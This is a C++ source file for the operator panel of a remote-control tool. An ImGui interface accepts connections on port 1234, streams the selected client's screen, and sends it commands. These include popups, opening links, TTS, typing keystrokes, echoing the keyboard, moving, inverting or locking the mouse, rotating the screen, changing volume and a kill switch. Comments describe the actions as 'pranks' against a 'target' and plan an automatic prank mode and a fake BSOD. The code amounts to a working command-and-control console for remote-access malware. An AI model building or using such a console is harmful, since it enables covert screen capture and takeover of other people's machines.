#include "ip.h"
#include "../../packet.h"
#include <GLFW/glfw3.h>
#include "imgui.h"
#include "imgui_impl_glfw.h"
#include "imgui_impl_opengl3.h"
#include <chrono>
#include <iostream>
#include <asio.hpp>
#include <mutex>
#include <thread>
#include <map>
#include <memory>
#define STB_IMAGE_IMPLEMENTATION
#include "stb_image.h"
using asio::ip::tcp;

class Client {
public:
    tcp::socket socket_;
    Client(tcp::socket socket)
        : socket_(std::move(socket)) {}

    void send(Packet& packet) {
        asio::write(socket_, asio::buffer(&packet, sizeof(packet)));
    }

    Packet receive(packet_id request_id) {

        Packet packet{};
        packet.id = packet_id::GET_DATA;
        packet.packetid = request_id;
    
        send(packet);
    
        Packet incoming{};
        asio::read(socket_, asio::buffer(&incoming, sizeof(Packet)));
    
        return incoming;
    }
};

class Server {
private:
    std::mutex client_mutex_;
    asio::io_context io_context_;
    tcp::acceptor acceptor_;
    int current_id_;
    std::map<int, std::unique_ptr<Client>> clients_;

    bool is_client_connected_unlocked(int selected_client) {
        return clients_.find(selected_client) != clients_.end();
    }
    Client* get_selected_client_unlocked() {
        for (const auto& [id, client] : clients_) {
            if (id == selected_client) {
                return client.get();
            }
        }
        return nullptr;
    }
public:
    int selected_client = -1;

    Server(const std::string& address, unsigned short port)
        : acceptor_(io_context_, tcp::endpoint(asio::ip::make_address(address), port)),
          current_id_(0) {}

    bool is_client_connected(int selected_client) {
        std::unique_lock<std::mutex> lock(client_mutex_);
        auto connected = get_connected_clients();
        bool result = false;
        for(int id : connected) {
            if(id == selected_client) {
                result = true;
                break;
            }
        }
        return result;
    }

    Client* get_selected_client() {
        std::unique_lock<std::mutex> lock(client_mutex_);
        for(const auto& [id, client] : clients_) {
            if(id == selected_client) {
                return client.get();
            }
        }
        return nullptr;
    }

    void handle_client_connect()
    {
        while (true)
        {
            auto socket = std::make_unique<tcp::socket>(io_context_);
            asio::error_code ec;
            acceptor_.accept(*socket, ec);
            if (ec) {
                std::cerr << "accept failed: " << ec.message() << '\n';
                continue;
            }
    
            asio::ip::tcp::endpoint ep = socket->remote_endpoint(ec);
            if (!ec) {
                std::string ip   = ep.address().to_string();
                unsigned short port = ep.port();
                std::cout << "New client from " << ip << ':' << port << '\n';
            } else {
                std::cerr << "remote_endpoint error: " << ec.message() << '\n';
            }
    
            std::unique_lock<std::mutex> lock(client_mutex_);
            clients_[current_id_++] = std::make_unique<Client>(std::move(*socket));
        }
    }

    void send_to_client(Packet& packet) {
        std::cout << "does this even run?\n";
        std::unique_lock<std::mutex> lock(client_mutex_);
    
        if (selected_client == -1) {
            std::cout << "Please select a client\n";
            return;
        }
        
        std::cout << "or is it here that it ends?\n";
        Client* cli = get_selected_client_unlocked();
        if(cli == nullptr) {
            std::cout << "is this where it ends?\n";
            return;
        }
        std::cout << "maybe it crashes after this?\n";
        try {
            std::cout << "is this where it crashes??\n";
            cli->send(packet);
            std::cout << "or is it here?\n";
            std::cout << "after trying to send packet to client\n"; 
        } catch (const std::exception& e) {
            std::cerr << "Send failed: " << e.what() << "\n";
        }
    }

    void all_client_send(Packet packet) {
        std::unique_lock<std::mutex> lock(client_mutex_);
        for(const auto& pair : clients_) {
            pair.second->send(packet);
        }
    }


    void check_if_client_alive() {
        while (true) {
            std::map<int, std::unique_ptr<Client>> still_alive;
    
            {
                std::unique_lock<std::mutex> lock(client_mutex_);
                for (auto& [id, client] : clients_) {
                    try {
                        Packet result = client->receive(packet_id::GET_DATA);
                        if (result.number == 1) {
                            still_alive[id] = std::move(client);  
                        } else {
                            std::cerr << "Client " << id << " returned unexpected data\n";
                        }
                    } catch (const std::exception& e) {
                        std::cerr << "Client " << id << " failed ping: " << e.what() << "\n";
                    }
                }
    
                clients_ = std::move(still_alive);
            }
    
            if (clients_.find(selected_client) == clients_.end()) {
                selected_client = -1;
            }
            std::this_thread::sleep_for(std::chrono::seconds(1));
        }
    }

    std::vector<int> get_connected_clients() {
        std::unique_lock<std::mutex> lock(client_mutex_);
        std::vector<int> cl;
        for(const auto& pair : clients_) {
            cl.push_back(pair.first);
        }
        return cl;
    }

    std::vector<unsigned char> get_video_frame(int &width, int &height) {
        Client* cli = get_selected_client();
        if(cli == nullptr)
            return {};

        Packet thing{};
        thing.id = packet_id::REQUEST_VIDEO_FRAME;
        
        std::cout << "before packet to client\n";
        send_to_client(thing);
        std::cout << "sent packet to client\n";

        int width_net, height_net, size_net;
        std::cout << "attempting to get size, height, and width\n";
        try {
            asio::read(cli->socket_, asio::buffer(&width_net, sizeof(width_net)));
            asio::read(cli->socket_, asio::buffer(&height_net, sizeof(height_net)));
            asio::read(cli->socket_, asio::buffer(&size_net, sizeof(size_net)));
        } catch(const std::exception e) {
            std::cout << "failed to get video frame \n";
            return {};
        }
        width = ntohl(width_net);
        height = ntohl(height_net);
        size_t size = ntohl(size_net);

        std::cout << "Width: " << width << "\n";
        std::cout << "Height: " << height<< "\n";
        std::cout << "Size: " << size << "\n";
        std::vector<unsigned char> buffer(size);
        asio::read(cli->socket_, asio::buffer(buffer.data(), size));
        return buffer;
    }
};

class Send_Field {
    private:
        char text_buffer[256] = "";
        Server& server;
        int selected_client;
        std::string lable;
        packet_id packetId;
    public:
    Send_Field(std::string lable_, packet_id packetId_, Server& server_) : server(server_), lable(lable_), packetId(packetId_) {}

    void draw() {
        selected_client = server.selected_client;
    
        ImGui::Text(lable.c_str());
        ImGui::SameLine();
    
        std::string input_id = "##input_" + lable;
        bool enter_pressed = ImGui::InputText(input_id.c_str(), text_buffer, sizeof(text_buffer), ImGuiInputTextFlags_EnterReturnsTrue);
    
        ImGui::SameLine();
        std::string button_id = "Send##" + lable;
        if (ImGui::Button(button_id.c_str()) || enter_pressed) {
            Packet packet{packetId};
            std::strcpy(packet.str, text_buffer);
            server.send_to_client(packet);
            std::strcpy(text_buffer, "");
        }
    }
};

class Toggle_Field {
    private:
        bool state = false;
        Server& server;
        std::string lable;
        packet_id packetid;
    public:
        Toggle_Field(std::string lable_, packet_id pac_id, Server &server_) : lable(lable_), packetid(pac_id), server(server_){}
        void draw() {
            ImGui::Text(lable.c_str());
            ImGui::SameLine();
            std::string button_lable = state ? ("on##" + lable) : ("off##" + lable);
            if(ImGui::Button(button_lable.c_str())) {
                state = !state;
                Packet packet{};
                packet.id = packetid;
                packet.bo = state;
                server.send_to_client(packet);
            }
        }
};

GLuint create_texture() {
    GLuint textureID;
    glGenTextures(1, &textureID);
    return textureID;
}
void modify_texture(const GLuint& textureID, unsigned char* data, int width, int height) {
    glBindTexture(GL_TEXTURE_2D, textureID);

    // Set texture filtering & wrapping
    glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MIN_FILTER, GL_LINEAR);
    glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MAG_FILTER, GL_LINEAR);

    // Upload pixels
    glTexImage2D(GL_TEXTURE_2D, 0, GL_RGBA, width, height, 0,
                 GL_RGBA, GL_UNSIGNED_BYTE, data);

    glBindTexture(GL_TEXTURE_2D, 0);
}


int main() {

    if (!glfwInit()) return -1;
    GLFWwindow* window = glfwCreateWindow(900, 500, "control pannel", 0, 0);
    if (!window) return glfwTerminate(), -1;
    glfwMakeContextCurrent(window);
    IMGUI_CHECKVERSION();
    ImGui::CreateContext();
    ImGui_ImplGlfw_InitForOpenGL(window, true);
    ImGui_ImplOpenGL3_Init("#version 130");
    ImGui::StyleColorsDark();
    
    static ImVec4 background_color = ImVec4(0.102f, 0.102f, 0.102f, 1.0f);

    Server server{ip, 1234};


    std::thread accept_thread([&server]() {
        server.handle_client_connect();
    });
    accept_thread.detach();

    // std::thread alive_thread([&server]() {
    //     server.check_if_client_alive();
    // });
    // alive_thread.detach();

    Send_Field popup{"Popup", packet_id::POPUP, server};
    Send_Field open{"Open", packet_id::OPEN_LINK, server};
    Send_Field tts{"Send tts", packet_id::TTS, server};

    Send_Field send_keyboard{"Type what", packet_id::SEND_KEYBOARD, server};
    Toggle_Field echo_keyboard{"Echo keyboard", packet_id::ECHO_KEYBOARD, server};

    Toggle_Field move_mouse{"Random move mouse",packet_id::RANDOM_MOUSE_MOVE,server};
    Toggle_Field invert_mouse{"Invert mouse", packet_id::INVERT_MOUSE,server};
    int mouse_x = 0,mouse_y = 0;
    int size_x = 100,size_y = 100;
    
    int selected_button = 0;
    GLuint texture_id = create_texture();
    while (!glfwWindowShouldClose(window)) {
        glfwPollEvents();
        ImGui_ImplOpenGL3_NewFrame();
        ImGui_ImplGlfw_NewFrame();
        
        
        ImGui::NewFrame();
             ImGui::Begin("Video");
                int height, width;
                std::vector<unsigned char> png = server.get_video_frame(width,height);
                modify_texture(texture_id, png.data(), width, height);
                ImVec2 video_space = ImGui::GetContentRegionAvail();
                ImGui::Image((ImTextureID)(intptr_t)texture_id, video_space);
             ImGui::End();

        ImGui::Begin("Send Data");
        /*
            d open an image from a link
                - or maybe send the image to be downloaded and then shown
            d send a pop up with a message of my choosing
                - group mode (a few pop ups)
                - life bar (how many times you have to close the popup before it does not come back)
                - infinite life mode
                - create popup that avoids the mouse

            d send link which gets opened in a browseien
            d send tts message
        */
        //std::cout << "before popup\n";
            popup.draw();
            open.draw();
            tts.draw();
        ImGui::End();

        ImGui::Begin("Mouse");
        /*
            d make mouse move randomly (t)
            d inverted mouse (t)
            d lock mouse to a small box
        */
        if(ImGui::CollapsingHeader("Mouse Position")) {
            ImGui::InputInt("Mouse x", &mouse_x);
            ImGui::InputInt("Mouse y", &mouse_y);
            if(ImGui::Button("SendTheMousePos")) {
                Packet packet{};
                packet.id = packet_id::CURSER_POS;
                packet.x = mouse_x;
                packet.y = mouse_y;
                server.send_to_client(packet);
            }
        }

        if(ImGui::CollapsingHeader("Mouse Control")) {
            move_mouse.draw();
            invert_mouse.draw();
        }
        if(ImGui::CollapsingHeader("Box Controls")) {
            ImGui::InputInt("Box X", &mouse_x);
            ImGui::InputInt("Box Y", &mouse_y);
            ImGui::InputInt("Box Size X", &size_x);
            ImGui::InputInt("Box Size Y", &size_y);

            if(ImGui::Button("Send Box magic")) {
                Packet packet{};
                packet.id = packet_id::LOCK_MOUSE;
                packet.x = mouse_x;
                packet.y = mouse_y;

                packet.size_x = size_x;
                packet.size_y = size_y;

                server.send_to_client(packet);
            }
            if(ImGui::Button("Release curser")) {
                Packet packet{};
                packet.id = packet_id::FREE_MOUSE;

                server.send_to_client(packet);
            }  
        }

            

        ImGui::End();

        ImGui::Begin("Keyboard");
        /*
            - send message to be typed by the user's keyboard
            - echo keyboard (repeats what was typed after a few seconds)
            - make it so keyboard presses become a random key (t)
        */
        send_keyboard.draw();
        echo_keyboard.draw();

        ImGui::End();

        ImGui::Begin("Visual & Sound");
        /*
            d flip screen (0, 90, 180, 270)
            d set system volume
            - fake BSOD 
        */

            ImVec4 selected_color = ImVec4(0.2f, 0.6f, 0.9f, 1.0f);
            ImVec4 normal_color = ImVec4(0.2f, 0.2f, 0.2f, 1.0f); 

            for (int i = 0; i <= 270; i += 90) {
                if (selected_button == i) {
                    ImGui::PushStyleColor(ImGuiCol_Button, selected_color);
                    ImGui::PushStyleColor(ImGuiCol_ButtonHovered, selected_color);
                    ImGui::PushStyleColor(ImGuiCol_ButtonActive, selected_color);
                } else {
                    ImGui::PushStyleColor(ImGuiCol_Button, normal_color);
                    ImGui::PushStyleColor(ImGuiCol_ButtonHovered, normal_color);
                    ImGui::PushStyleColor(ImGuiCol_ButtonActive, normal_color);
                }

                if (ImGui::RadioButton(std::to_string(i).c_str(), selected_button == i)) {
                    selected_button = i;  
                }

                ImGui::PopStyleColor(3); 
            }

            if (ImGui::Button("Send rotation")) {
                Packet packet23{};
                packet23.id = packet_id::ROTATE_SCREEN;
                packet23.number = selected_button;

                server.send_to_client(packet23);
            }
            
            static int volume;
            ImGui::SliderInt("Volume", &volume, 0, 100);

            if(ImGui::Button("Send Volume")) {
                Packet a_the_betst_backet{};
                a_the_betst_backet.id = packet_id::SYSTEM_SOUND;
                a_the_betst_backet.number = volume;

                server.send_to_client(a_the_betst_backet);
            }
            
        ImGui::End();


        ImGui::Begin("Manage");
        /*
            - Start/Stop all button
            d A target selector
            d Add a kill button
            - A auto mode which does pranks automatically
            - A log of pranks ran
            - Add a prank schedual
        */
            std::vector<int> clients = server.get_connected_clients();

            for (auto id : clients) {
                std::string label = "Client: " + std::to_string(id);
                bool is_selected = (server.selected_client == id);
            
                if (is_selected) {
                    ImGui::PushStyleColor(ImGuiCol_Button, ImVec4(0.2f, 0.6f, 0.9f, 1.0f));
                }
                if (ImGui::Button(label.c_str())) {
                    std::cout << "Selected client: " << id << "\n";
                    server.selected_client = id;
                }
            
                if (is_selected)
                    ImGui::PopStyleColor();  
                if(is_selected) {
                    ImGui::SameLine();
                    if(ImGui::Button("Kill")) {
                        Packet kill_packet{};

                        kill_packet.id = packet_id::KILL;
                        server.send_to_client(kill_packet);
                    }
                }
            
            }
            ImGui::NewLine();  
        ImGui::End();

        ImGui::Begin("customize");
            ImGui::ColorPicker3("Background", (float*)&background_color);
        ImGui::End();

        ImGui::Render();
        int w_, h_; glfwGetFramebufferSize(window, &w_, &h_);
        glViewport(0, 0, w_, h_);
        glClearColor(background_color.x, background_color.y, background_color.z, 1.0f);
        glClear(GL_COLOR_BUFFER_BIT);
        ImGui_ImplOpenGL3_RenderDrawData(ImGui::GetDrawData());
        glfwSwapBuffers(window);
    }
    ImGui_ImplOpenGL3_Shutdown();
    ImGui_ImplGlfw_Shutdown();
    ImGui::DestroyContext();
    glfwDestroyWindow(window);
    glfwTerminate();
    return 0;
}
